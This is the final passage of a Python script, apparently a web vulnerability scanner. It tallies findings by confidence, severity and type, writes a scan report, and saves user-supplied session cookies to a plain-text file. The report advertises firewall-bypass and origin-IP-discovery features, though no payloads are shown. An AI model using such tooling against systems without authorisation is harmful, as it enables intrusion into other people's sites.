        with open(takeover_file, 'r', encoding='utf-8') as f:
            takeover_findings = f.readlines()
            all_findings.extend(takeover_findings)

    if all_findings:
        confidence_levels = {'HIGH': 0, 'MEDIUM': 0, 'LOW': 0}
        severity_levels = {'CRITICAL': 0, 'HIGH': 0, 'MEDIUM': 0, 'LOW': 0, 'INFO': 0}
        vuln_types = {}

        for line in all_findings:
            if 'HIGH CONFIDENCE' in line:
                confidence_levels['HIGH'] += 1
            elif 'MEDIUM CONFIDENCE' in line:
                confidence_levels['MEDIUM'] += 1
            elif 'LOW CONFIDENCE' in line:
                confidence_levels['LOW'] += 1

            if '[CRITICAL]' in line:
                severity_levels['CRITICAL'] += 1
            elif '[HIGH]' in line:
                severity_levels['HIGH'] += 1
            elif '[MEDIUM]' in line:
                severity_levels['MEDIUM'] += 1
            elif '[LOW]' in line:
                severity_levels['LOW'] += 1
            elif '[INFO]' in line:
                severity_levels['INFO'] += 1

            # Count vulnerability types
            for vtype in ['SQLi', 'XSS', 'RCE', 'LFI', 'SSRF', 'Open-Redirect', 'CORS', 'SSTI', 'IDOR', 'WordPress', 'Secret', 'Subdomain-Takeover']:
                if f'][{vtype}]' in line or f'][{vtype}-' in line:
                    vuln_types[vtype] = vuln_types.get(vtype, 0) + 1
                    break

        print(f"\n{G}[+] Confidence Summary:{W}")
        for level, count in confidence_levels.items():
            if count > 0:
                color = R if level == 'HIGH' else Y if level == 'MEDIUM' else B
                print(f"    {color}• {level} CONFIDENCE: {count} findings{W}")

        print(f"\n{G}[+] Severity Summary:{W}")
        for level, count in severity_levels.items():
            if count > 0:
                color = R if level in ['CRITICAL', 'HIGH'] else Y if level in ['MEDIUM', 'LOW'] else B
                print(f"    {color}• {level}: {count} findings{W}")

        if vuln_types:
            print(f"\n{G}[+] Vulnerability Types:{W}")
            for vtype, count in sorted(vuln_types.items(), key=lambda x: x[1], reverse=True):
                print(f"    {B}• {vtype}: {count}{W}")

        print(f"\n{G}[+] Files Created:{W}")
        print(f"    {B}• Results: {out}/results.txt{W}")
        print(f"    {B}• Detailed Vulns: {out}/vuln_details.json{W}")
        print(f"    {B}• Subdomains: {out}/subdomains.txt{W}")
        print(f"    {B}• Live Subdomains: {out}/live_subdomains.txt{W}")
        print(f"    {B}• All URLs: {out}/all_urls.txt{W}")
        if takeover_findings:
            print(f"    {B}• Takeovers: {out}/subdomain_takeovers.txt{W}")
        if USER_COOKIES:
            print(f"    {B}• Cookies: {out}/cookies.txt{W}")
            with open(f"{out}/cookies.txt", 'w') as f:
                for key, value in USER_COOKIES.items():
                    f.write(f"{key}={value}\n")

        report_file = f"{out}/scan_report.txt"
        with open(report_file, 'w') as f:
            f.write(f"Scan Report - {clean}\n")
            f.write(f"Generated: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}\n")
            f.write("=" * 50 + "\n\n")
            f.write(f"Subdomains: {len(all_subdomains)}\n")
            f.write(f"Live Subdomains: {len(live_subdomains)}\n")
            f.write(f"URLs Scanned: {len(all_urls)}\n")
            f.write(f"Cookies Loaded: {len(USER_COOKIES)}\n")
            f.write(f"Total Findings: {len(all_findings)}\n\n")

            f.write("=== Confidence Levels ===\n")
            for level, count in confidence_levels.items():
                if count > 0:
                    f.write(f"{level}: {count}\n")

            f.write("\n=== Severity Levels ===\n")
            for level, count in severity_levels.items():
                if count > 0:
                    f.write(f"{level}: {count}\n")

            f.write("\n=== Vulnerability Types ===\n")
            for vtype, count in vuln_types.items():
                f.write(f"{vtype}: {count}\n")

            f.write("\n=== Advanced Features ===\n")
            f.write("✓ Baseline Profiling\n")
            f.write("✓ Confidence Scoring (LOW/MEDIUM/HIGH)\n")
            f.write("✓ Reflection Context Analysis\n")
            f.write("✓ SSRF Trigger Intelligence\n")
            f.write("✓ Open Redirect Strict Validation\n")
            f.write("✓ Execution Controller\n")
            f.write("✓ Capability Detection\n")
            f.write("✓ WAF Bypass 2026 (Cloudflare, Akamai, AWS)\n")
            f.write("✓ Origin IP Discovery (Unique Only)\n")
            f.write("✓ IDOR Intelligence Engine\n")
            f.write("✓ Cookie Support\n")
            f.write("✓ 90% Less False Positives\n")

        print(f"\n{G}[+] Full report: {out}/scan_report.txt{W}")
    else:
        print(f"\n{Y}[!] No vulnerabilities found (advanced filtering applied){W}")

    print(f"\n{C}═════════════════════════════════════════════════════════════{W}")
    print(f"{G}[+] Scan completed successfully! 🎯{W}")
    print(f"{C}═════════════════════════════════════════════════════════════{W}")


if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n{R}[!] Scan interrupted by user{W}")
        sys.exit(0)
    except Exception as e:
        print(f"\n{R}[!] Unexpected error: {str(e)}{W}")
        sys.exit(1)